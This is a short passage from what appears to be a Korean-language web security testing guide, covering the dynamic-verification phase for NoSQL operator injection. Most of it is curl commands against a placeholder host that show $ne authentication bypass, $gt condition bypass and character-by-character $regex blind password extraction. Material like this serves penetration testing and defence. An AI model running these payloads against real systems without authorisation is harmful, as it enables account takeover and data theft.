### Phase 2: 동적 테스트 (검증)


**Operator Injection 테스트 (JSON body):**
```
# 인증 우회: password를 {"$ne": ""}로 설정
curl -X POST "https://target.com/api/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":{"$ne":""}}'

# 데이터 유출: $gt 연산자로 조건 우회
curl -X POST "https://target.com/api/search" \
  -H "Content-Type: application/json" \
  -d '{"age":{"$gt":0}}'
```

**Operator Injection 테스트 (Query string):**
```
# Express qs parser가 중첩 객체를 생성하는 경우
curl "https://target.com/api/users?username=admin&password[$ne]="
```

**$regex를 이용한 Blind Injection 테스트:**
```
# 첫 글자가 'a'인지 확인
curl -X POST "https://target.com/api/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":{"$regex":"^a"}}'

# 첫 글자가 'b'인지 확인 (응답 차이로 판별)
curl -X POST "https://target.com/api/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":{"$regex":"^b"}}'
```

**검증 기준:**
- **확인됨**: 동적 테스트로 연산자 삽입을 통해 쿼리 로직이 변경된 것을 직접 확인함 (인증 우회, 의도하지 않은 데이터 반환 등)
